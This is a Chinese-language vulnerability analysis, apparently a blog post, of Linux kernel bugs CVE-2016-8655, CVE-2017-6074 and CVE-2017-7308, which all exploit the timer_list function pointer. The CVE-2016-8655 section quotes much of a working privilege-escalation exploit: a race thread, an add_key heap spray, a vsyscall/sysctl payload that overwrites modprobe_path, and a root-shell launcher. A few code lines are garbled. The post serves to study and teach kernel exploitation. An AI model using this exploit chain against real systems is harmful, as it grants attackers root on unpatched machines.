## 前言
CVE-2016-8655/CVE-2017-6074/CVE-2017-7308都是linux内核中与网络协议有关的漏洞，并且EXP都采用了覆盖timer_list结构体中函数的方法，本文试图通过分析这几个漏洞和读者一起学习。  
linux内核使用timer_list结构体做为定时器。
    struct timer_list {
        /*
         * All fields that change during normal runtime grouped to the
         * same cacheline
         */
        struct hlist_node   entry;
        unsigned long       expires;
        void            (*function)(unsigned long);
        unsigned long       data;
        u32         flags;
        int         slack;
    #ifdef CONFIG_TIMER_STATS
        int         start_pid;
        void            *start_site;
        char            start_comm[16];
    #endif
    #ifdef CONFIG_LOCKDEP
        struct lockdep_map  lockdep_map;
    #endif
    };
我们重点关注前几个成员：entry是定时器链表的入口，expires是定时器到期时间，function是定时器处理函数，data是传给定时器处理函数的参数。定时器到期时，function就会被执行。下面我们就来看看这个结构体在内核漏洞利用中的使用。
## 内核调试方法
有下面几种常用的内核调试方法可供选择，都有比较详细的文章。  
1.自己编译内核使用qemu+busybox调试  
2.使用virtualbox/vmware搭建两台虚拟机用串口通信调试  
3.使用vmware提供的gdb stub调试  
不过最后一种方法需要物理机也是linux系统。使用virtualbox用串口通信调试的设置和vmware略有不同，host和target的设置如下。  
先启动target再启动host。
## CVE-2016-8655
关于这个漏洞已经有比较详细分析了[4]，下面和大家一起学习一下。  
packet_set_ring函数在创建ringbuffer的时候，如果packet版本为TPACKET_V3会初始化定时器。
    case TPACKET_V3:
            /* Transmit path is not supported. We checked
             * it above but just being paranoid
             */
                if (!tx_ring)
                    init_prb_bdqc(po, rb, pg_vec, req_u);
                break;
            default:
                break;
调用路径：packet_set_ring()->init_prb_bdqc()->prb_setup_retire_blk_timer()->prb_init_blk_timer()->init_timer()。  
关闭socket时会再次调用packet_set_ring函数，如果packet的版本大于TPACKET_V2，内核会在队列中注销掉先前的定时器。
    if (closing && (po->tp_version > TPACKET_V2)) {
            /* Because we don't support block-based V3 on tx-ring */
            if (!tx_ring)
                prb_shutdown_retire_blk_timer(po, rb_queue);
        }
调用路径：packet_set_ring()->prb_shutdown_retire_blk_timer()->prb_del_retire_blk_timer()->del_timer_sync()->del_timer()。  
但是中间这段时间如果其它线程调用setsockopt将packet设为TPACKET_V1，前面初始化的定时器就不会在内核队列中注销，过期时就会触发定时器中回调函数的执行。这样，在timer_list结构体上就形成了UAF，可以使用堆喷射的方法把function替换为我们想要执行的函数。EXP中触发漏洞的代码如下。
    void *vers_switcher(void *arg)
    {
        int val,x,y;
        while(barrier) {}
        while(1) {
            val = TPACKET_V1;
            x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
            y++;
            if(x != 0) break;
            val = TPACKET_V3;
            x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
            if(x != 0) break;
            y++;
        }
        fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
        vers_switcher_done = 1;
        return NULL;
    }
具体喷射用的是add_key函数。
    #define BUFSIZE 1408
    char exploitbuf[BUFSIZE];
    void kmalloc(void)
    {
        while(1)
            syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);
    }
这里的exploitbuf是1408个字节但是指定的长度是1408-24个字节，因为在add_key函数中会调用到user_preparse函数，它会先创建大小为24字节的user_key_payload结构体。
    /*
     * Preparse a user defined key payload
     */
    int user_preparse(struct key_preparsed_payload *prep)
    {
        struct user_key_payload *upayload;
        size_t datalen = prep->datalen;
        if (datalen  32767 || !prep->data)
            return -EINVAL;
        upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
        if (!upayload)
            return -ENOMEM;
        /* attach the data */
        prep->quotalen = datalen;
        prep->payload.data[0] = upayload;
        upayload->datalen = datalen;
        memcpy(upayload->data, prep->data, datalen);
        return 0;
    }
    EXPORT_SYMBOL_GPL(user_preparse);
timer_list结构体相对于exploitbuf的偏移是0x35E个字节，因为data在user_key_payload结构体中的偏移是0x12个字节，
而timer_list结构体在packet_sock结构体中的偏移是0x370个字节(0x35E+0x12=0x370)。
    struct user_key_payload {
        struct rcu_head rcu;        /* RCU destructor */
        unsigned short  datalen;    /* length of this data */
        char        data[0];    /* actual data */
    };
第一次触发漏洞，通过调用set_memory_rw函数将vsyscall页设置成可写属性页。  
然后再修改vsyscall页内容为构造的ctl_table结构体的数据，将data设置为moprobe_path(/sbin/modprobe)。
    void wrapper(void)
    {
        struct ctl_table *c;
        fprintf(stderr,"exploit starting\n");
        printf("making vsyscall page writable..\n\n");
        exploit(off->set_memory_rw, VSYSCALL, verify_stage1);
        printf("\nstage 1 completed\n");
        sleep(5);
        printf("registering new sysctl..\n\n");
        c = (struct ctl_table *)(VSYSCALL+0x850);
        memset((char *)(VSYSCALL+0x850), '\x00', 1952);
        strcpy((char *)(VSYSCALL+0xf00),"hack");
        memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
        c->procname = (char *)(VSYSCALL+0xf00);
        c->mode = 0666;
        c->proc_handler = (void *)(off->proc_dostring);
        c->data = (void *)(off->modprobe_path);
        c->maxlen=256;
        c->extra1 = (void *)(VSYSCALL+0xe00);
        c->extra2 = (void *)(VSYSCALL+0xd00);
        exploit(off->register_sysctl_table, VSYSCALL+0x850, verify_stage2);
        printf("stage 2 completed\n");
    }
第二次触发漏洞，通过调用register_sysctl_table函数注册构造的ctl_table结构体对应的sysctl条目。  
然后再把/proc/sys/hack改成当前程序的路径，调用socket函数引用未被内核加载的网络驱动模块，内核会依次调用：inet_create ->
request_module -> call_modprobe ->
call_usermodehelper_setup&call_usermodehelper_exec ->
call_usermodehelper_exec_work -> call_usermodehelper_exec_async -> do_execve。  
在call_usermodehelper_exec_async中调用do_execve之前会调用commit_creds(prepare_kernel_cred(0))。而call_modprobe中指定的modprobe_path是/sbin/modprobe，被替换成了poc程序的绝对路径，于是poc程序就以root权限运行了。这种方法是在[6]中提出的。  
    void launch_rootshell(void)
    {
        int fd;
        char buf[256];
        struct stat s;
        fd = open("/proc/sys/hack",O_WRONLY);
        if(fd == -1) {
            fprintf(stderr,"could not open /proc/sys/hack\n");
            exit(-1);
        }
        memset(buf,'\x00', 256);
        readlink("/proc/self/exe",(char *)&buf,256);
        write(fd,buf,strlen(buf)+1);
        socket(AF_INET,SOCK_STREAM,132);
        if(stat(buf,&s) == 0 && s.st_uid == 0) {
            printf("binary executed by kernel, launching rootshell\n");
            lseek(fd, 0, SEEK_SET);
            write(fd,"/sbin/modprobe",15);
            close(fd);
            execl(buf,buf,NULL);
        }
        else
            printf("could not create rootshell\n");
    }
## CVE-2017-6074
在dccp_rcv_state_process函数中，如果dccp_v6_conn_request函数成功返回就会调用__kfree_skb函数强制释放skb。
    if (sk->sk_state == DCCP_LISTEN) {
            if (dh->dccph_type == DCCP_PKT_REQUEST) {
                if (inet_csk(sk)->icsk_af_ops->conn_request(sk,
                                        skb) pktopts并且引用计数+1。然而，dccp_rcv_state_process函数仍然会把skb释放掉，造成了UAF。
    if (ipv6_opt_accepted(sk, skb, IP6CB(skb)) ||
            np->rxopt.bits.rxinfo || np->rxopt.bits.rxoinfo ||
            np->rxopt.bits.rxhlim || np->rxopt.bits.rxohlim) {
            atomic_inc(&skb->users);
            ireq->pktopts = skb;
我们可以使用同样的方法利用这个漏洞，这一次把timer_list结构体中的function替换为native_write_cr4禁用SMEP&SMAP。  
然后通过覆盖skb_shared_info结构体中的函数指针使得在释放skb时执行被替换后的用户态中的提权函数。  
## CVE-2017-7308
Project Zero的一篇文章中描述了这个漏洞从发现到利用的全部过程[5]，下面和大家一起学习一下。  
packet_set_ring函数中存在一处整数溢出。
    if (po->tp_version >= TPACKET_V3 &&
                (int)(req->tp_block_size -                  BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)) <= 0)
                goto out;
这个检查过程的目的是确保内存块头部加上每个内存块私有数据的大小不超过内存块自身的大小。然而，这个检查是可以绕过的。